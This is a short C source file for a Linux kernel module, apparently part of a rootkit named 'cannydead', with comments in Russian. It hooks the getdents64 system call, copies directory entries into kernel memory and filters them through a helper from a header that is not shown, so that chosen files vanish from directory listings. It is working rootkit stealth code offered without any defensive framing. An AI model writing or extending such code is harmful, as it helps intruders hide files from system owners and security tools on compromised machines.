#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include "cannydead_hide.h"

asmlinkage long (*real_getdents64)(unsigned int, struct linux_dirent64 __user *, unsigned int);

asmlinkage long hooked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
{
    printk(KERN_INFO "cannydead: hooked_getdents64 called\n");
    long ret = real_getdents64(fd, dirp, count);
    if (ret <= 0)
        return ret;

    // Выделяем буфер в ядре
    struct linux_dirent64 *kdirp = kmalloc(ret, GFP_KERNEL);
    if (!kdirp)
        return ret;

    if (copy_from_user(kdirp, dirp, ret) != 0) {
        kfree(kdirp);
        return ret;
    }

    // Фильтруем скрываемые файлы
    int new_ret = cannydead_filter_dirent(kdirp, ret);

    // Копируем обратно в userspace
    if (copy_to_user(dirp, kdirp, new_ret) != 0) {
        kfree(kdirp);
        return ret;
    }

    kfree(kdirp);
    return new_ret;
}